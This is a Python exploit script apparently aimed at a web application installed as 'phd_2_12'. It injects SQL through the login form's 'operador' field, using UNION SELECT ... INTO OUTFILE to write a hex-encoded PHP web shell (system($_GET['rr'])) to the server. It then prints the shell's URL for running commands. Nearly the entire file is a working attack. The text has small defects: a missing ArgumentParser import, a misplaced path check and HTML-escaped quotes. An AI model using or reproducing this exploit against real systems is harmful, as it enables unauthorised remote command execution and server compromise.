import string
import random
import urllib, urllib2
import sys
 
def run(options):
    print &#039;[!] Dropping web shell on %s...&#039;%(options.ip)
 
    shell = &#039;&#039;.join(random.choice(string.ascii_lowercase+string.digits) for x in range(5))
 
    # <? php system($_GET["rr"]); ?>
    data = urllib.urlencode({&#039;operador&#039;:(&#039;\&#039; UNION SELECT 0x3c3f7068702073797374656d28245f4745545b227272225d293b3f3e&#039;
                                    &#039;,null,null,null,null,null,null,null,null,null,null,null,null,null INTO OUTFILE&#039;
                                        &#039; \&#039;{0}/{1}.php&#039;.format(options.path,shell)),
                             &#039;contrasenia&#039;:&#039;pass&#039;,
                             &#039;submit&#039;:&#039;Enter&#039;,
                             &#039;captcha&#039;:&#039;&#039;})
 
    urllib2.urlopen(&#039;http://{0}{1}/login.php&#039;.format(options.ip, options.rootp), data)
    print &#039;[!] Shell dropped.  http://%s%s/%s.php?rr=ls&#039;%(options.ip,options.rootp,shell)
 
def parse():
    parser = ArgumentParser()
    parser.add_argument(&#039;-i&#039;,help=&#039;server address&#039;,action=&#039;store&#039;,dest=&#039;ip&#039;)
    parser.add_argument(&#039;-p&#039;,help=&#039;path to login.php (/phd_2_12)&#039;,action=&#039;store&#039;,
                default=&#039;/phd_2_12&#039;, dest=&#039;rootp&#039;)
    parser.add_argument(&#039;-w&#039;,help=&#039;writable web path (/var/www/phd_2_12) for shell&#039;,
                default=&#039;/var/www/phd_2_12/&#039;, action=&#039;store&#039;, dest=&#039;path&#039;)
 
    options = parser.parse_args()
    if not options.ip:
        parser.print_help()
        sys.exit(1)
 
    options.path = options.path if options.path[-1] != &#039;/&#039; else options.path[:-1]
    options.rootp = options.rootp if options.path[-1] != &#039;/&#039; else options.path[:-1]
    return options
 
if __name__=="__main__":
    run(parse())

